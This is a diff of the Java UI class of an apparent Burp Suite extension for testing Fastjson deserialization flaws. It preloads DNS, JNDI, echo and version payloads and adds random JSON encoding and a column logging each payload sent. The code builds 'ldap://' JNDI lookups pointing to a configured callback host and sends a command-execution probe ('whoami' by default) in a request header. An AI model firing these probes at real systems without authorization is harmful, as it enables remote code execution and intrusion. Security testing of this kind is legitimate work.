@@ -5,10 +5,13 @@ import burp.bean.ConfigBean;
 import burp.bean.FastjsonBean;
 import burp.ui.UIHepler.GridBagConstraintsHelper;
 import burp.utils.CustomScanIssue;
+import burp.utils.JsonUtils;
 import burp.utils.Utils;
 
+import javax.rmi.CORBA.Util;
 import javax.swing.*;
 import javax.swing.table.AbstractTableModel;
+import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.TableColumnModel;
 import javax.swing.table.TableModel;
 import java.awt.*;
@@ -37,6 +40,12 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
     private IMessageEditor HRequestTextEditor; // 请求编辑器
     private IMessageEditor HResponseTextEditor; // 响应编辑器
     private static final List<FastjsonEntry> fastjsonlog = new ArrayList<>(); // fastjson日志
+    public static String dnslog; // dnslog地址
+    public static String ip; // ip地址
+    private static List<FastjsonBean> jndiPayloads = new ArrayList<>(); // jndi payloads
+    private static List<FastjsonBean> versionPayloads = new ArrayList<>(); // jndi payloads
+    private static List<FastjsonBean> dnsPayloads = new ArrayList<>(); // jndi payloads
+    private static List<FastjsonBean> echoPayloads = new ArrayList<>(); // jndi payloads
 
     @Override
     public IHttpService getHttpService() {
@@ -55,6 +64,13 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
 
     @Override
     public void init() {
+
+        dnslog = getConfig("config", "dnslog").getValue();
+        ip = getConfig("config", "ip").getValue();
+        jndiPayloads = getFastjsonListsByType("jndi");
+        versionPayloads = getFastjsonListsByType("version");
+        dnsPayloads = getFastjsonListsByType("dns");
+        echoPayloads = getFastjsonListsByType("echo");
         setupUI();
         setupData();
     }
@@ -91,6 +107,22 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         fastjsonTable = new URLTable(new FastjsonModel());
         JScrollPane scrollPane = new JScrollPane(fastjsonTable);
         mainsplitPane.setTopComponent(scrollPane);
+
+        // 创建一个自定义的单元格渲染器
+        DefaultTableCellRenderer renderer = new DefaultTableCellRenderer() {
+            @Override
+            public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
+                JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
+                label.setHorizontalAlignment(JLabel.CENTER);
+                label.setHorizontalTextPosition(JLabel.CENTER);
+                label.setIconTextGap(0);
+                label.setMaximumSize(new Dimension(Integer.MAX_VALUE, label.getPreferredSize().height));
+                label.setToolTipText((String) value); // 设置鼠标悬停时显示的提示文本
+                return label;
+            }
+        };
+
+        fastjsonTable.getColumnModel().getColumn(5).setCellRenderer(renderer);
 
         // 左右分割面板,对称分割
         JSplitPane splitPaneDown = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
@@ -131,33 +163,17 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         String url = analyzeRequest.getUrl().toString();
         List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
         String res = "dnslog检测,请查看dnslog服务器";
-        List<FastjsonBean> payloads = getFastjsonListsByType("dns");
-        if (payloads.isEmpty()) {
-            JOptionPane.showMessageDialog(null, "请先添加dnslog payload", "提示", JOptionPane.ERROR_MESSAGE);
-            return;
-        }
-        String dnslog = "";
-        try {
-            ConfigBean dnslogKey = getConfig("config", "dnslog");
-            dnslog = dnslogKey.getValue();
-            if (dnslog.isEmpty()) {
-                JOptionPane.showMessageDialog(null, "请先在Config面板设置dnslog地址", "提示", JOptionPane.ERROR_MESSAGE);
-                return;
-            }
-        } catch (Exception e) {
-            JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
-            return;
-        }
         IHttpService iHttpService = baseRequestResponse.getHttpService();
-        for (FastjsonBean fastjson : payloads) {
+        for (FastjsonBean fastjson : dnsPayloads) {
             String fastjsonDnslog = fastjson.getValue();
             String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslog);
-            byte[] bytePayload = Utils.helpers.stringToBytes(fuzzPayload);
+            String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
+            byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
             byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
             IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
             IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
             String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-            add(extensionMethod, url, statusCode, res, resp);
+            add(extensionMethod, url, statusCode, res, fuzzPayload,resp);
         }
 
     }
@@ -169,11 +185,6 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         String extensionMethod = analyzeRequest.getMethod();
         String url = analyzeRequest.getUrl().toString();
         List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        List<FastjsonBean> payloads = getFastjsonListsByType("echo");
-        if (payloads.isEmpty()) {
-            JOptionPane.showMessageDialog(null, "请先添加echo payload", "提示", JOptionPane.ERROR_MESSAGE);
-            return;
-        }
         // 弹出一个输入框，用于获取用户输入的dnslog地址
         String defaultValue = "whoami";
         String echoVul = (String) JOptionPane.showInputDialog(null, "请输入echo 命令", "提示", JOptionPane.PLAIN_MESSAGE, null, null, defaultValue);
@@ -182,7 +193,7 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
             return;
         }
         IHttpService iHttpService = baseRequestResponse.getHttpService();
-        Iterator<FastjsonBean> iterator = payloads.iterator();
+        Iterator<FastjsonBean> iterator = echoPayloads.iterator();
         headers.add("Accept-Cache: " + echoVul);
         while (iterator.hasNext()) {
             FastjsonBean fastjson = iterator.next();
@@ -201,7 +212,7 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
                 }
             }
             if (containsContentAuth) {
-                add(extensionMethod, url, statusCode, "echo命令检测完成,发现结果", resp);
+                add(extensionMethod, url, statusCode, "echo命令检测完成,发现结果",fastjsonEcho, resp);
                 IScanIssue issues = null;
                 try {
                     issues = new CustomScanIssue(iHttpService, new URL(url), new IHttpRequestResponse[]{resp},
@@ -212,7 +223,7 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
                     throw new RuntimeException(e);
                 }
             } else {
-                add(extensionMethod, url, statusCode, "echo命令检测完成,未发现结果", resp);
+                add(extensionMethod, url, statusCode, "echo命令检测完成,未发现结果",fastjsonEcho, resp);
             }
         }
     }
@@ -224,48 +235,21 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         String url = analyzeRequest.getUrl().toString();
         List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
         try {
-            List<FastjsonBean> payloads = getFastjsonListsByType("jndi");
-            if (payloads.isEmpty()) {
-                JOptionPane.showMessageDialog(null, "请先添加jndi payload", "提示", JOptionPane.ERROR_MESSAGE);
-                return;
-            }
+
             String jndiStr = "";
             String defaultValue = "IP"; // 设置默认值
             String[] options = {"DNS", "IP"}; // 单选框选项
             String selectedValue = (String) JOptionPane.showInputDialog(null, "请选择类型", "提示",
                     JOptionPane.PLAIN_MESSAGE, null, options, defaultValue);
             if (Objects.equals(selectedValue, "DNS")) {
-                try {
-                    ConfigBean config = getConfig("config", "dnslog");
-                    String dnslog = config.getValue();
-                    if (dnslog.isEmpty()) {
-                        JOptionPane.showMessageDialog(null, "请先在Config面板设置dnslog地址", "提示", JOptionPane.ERROR_MESSAGE);
-                        return;
-                    } else {
-                        jndiStr = dnslog;
-                    }
-                } catch (Exception e) {
-                    JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
-                    return;
-                }
-            } else if (Objects.equals(selectedValue, "IP")) {
-                try {
-                    ConfigBean config = getConfig("config", "ip");
-                    String ip = config.getValue();
-                    if (ip.isEmpty()) {
-                        JOptionPane.showMessageDialog(null, "请先在Config面板设置IP地址", "提示", JOptionPane.ERROR_MESSAGE);
-                        return;
-                    } else {
-                        jndiStr = ip;
-                    }
-                } catch (Exception e) {
-                    JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
-                    return;
-                }
+                jndiStr = dnslog;
+            }
+            if (Objects.equals(selectedValue, "IP")) {
+                jndiStr = ip;
             }
 
             IHttpService iHttpService = baseRequestResponse.getHttpService();
-            for (FastjsonBean payload : payloads) {
+            for (FastjsonBean payload : jndiPayloads) {
                 String dnslogKey = "";
 
                 String fastjsonJNDI = payload.getValue();
@@ -276,12 +260,13 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
                     dnslogKey = "ldap://" + jndiStr + "/" + id;
                 }
                 String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
-                byte[] bytePayload = Utils.helpers.stringToBytes(fuzzPayload);
+                String jsonPayload = JsonUtils.encodeToJsonRandom(fuzzPayload);
+                byte[] bytePayload = Utils.helpers.stringToBytes(jsonPayload);
                 byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                 IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                 IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                 String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-                add(extensionMethod, url, statusCode, "jndi检测完成,请查看服务器", resp);
+                add(extensionMethod, url, statusCode, "jndi检测完成,请查看服务器",fuzzPayload, resp);
             }
         } catch (Exception e) {
             Utils.stderr.println(e.getMessage());
@@ -294,27 +279,22 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         String extensionMethod = analyzeRequest.getMethod();
         String url = analyzeRequest.getUrl().toString();
         List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
-        List<FastjsonBean> payloads = getFastjsonListsByType("version");
-        if (payloads.isEmpty()) {
-            JOptionPane.showMessageDialog(null, "请先添加version payload", "提示", JOptionPane.ERROR_MESSAGE);
-            return;
-        }
         IHttpService iHttpService = baseRequestResponse.getHttpService();
-        for (FastjsonBean fastjson : payloads) {
+        for (FastjsonBean fastjson : versionPayloads) {
             String fastjsonVersion = fastjson.getValue();
             byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
             byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
             IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
             IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
             String statusCode = String.valueOf(iResponseInfo.getStatusCode());
-            add(extensionMethod, url, statusCode, "version检测完成,请查看返回包", resp);
+            add(extensionMethod, url, statusCode, "version检测完成,请查看返回包",fastjsonVersion, resp);
         }
     }
     // 添加日志
-    private static void add(String extensionMethod, String url, String status, String res, IHttpRequestResponse baseRequestResponse) {
+    private static void add(String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse baseRequestResponse) {
         synchronized (fastjsonlog) {
             int id = fastjsonlog.size();
-            fastjsonlog.add(new FastjsonEntry(id, extensionMethod, url, status, res, baseRequestResponse));
+            fastjsonlog.add(new FastjsonEntry(id, extensionMethod, url, status, res,req, baseRequestResponse));
             fastjsonTable.updateUI();
         }
     }
@@ -328,7 +308,7 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
 
         @Override
         public int getColumnCount() {
-            return 5;
+            return 6;
         }
 
         @Override
@@ -345,6 +325,8 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
                     return logEntry.status;
                 case 4:
                     return logEntry.res;
+                case 5:
+                    return logEntry.req;
                 default:
                     return "";
             }
@@ -363,6 +345,8 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
                     return "status";
                 case 4:
                     return "res";
+                case 5:
+                    return "req";
                 default:
                     return "";
             }
@@ -377,16 +361,18 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
         final String url;
         final String status;
         final String res;
+        final String req;
 
         final IHttpRequestResponse requestResponse;
 
 
-        private FastjsonEntry(int id, String extensionMethod, String url, String status, String res, IHttpRequestResponse requestResponse) {
+        private FastjsonEntry(int id, String extensionMethod, String url, String status, String res,String req, IHttpRequestResponse requestResponse) {
             this.id = id;
             this.extensionMethod = extensionMethod;
             this.url = url;
             this.status = status;
             this.res = res;
+            this.req = req;
             this.requestResponse = requestResponse;
         }
     }
@@ -396,6 +382,7 @@ public class FastjsonUI implements UIHandler, IMessageEditorController {
             super(tableModel);
             TableColumnModel columnModel = getColumnModel();
             columnModel.getColumn(0).setMaxWidth(50);
+            columnModel.getColumn(5).setMaxWidth(250);
         }
 
         @Override
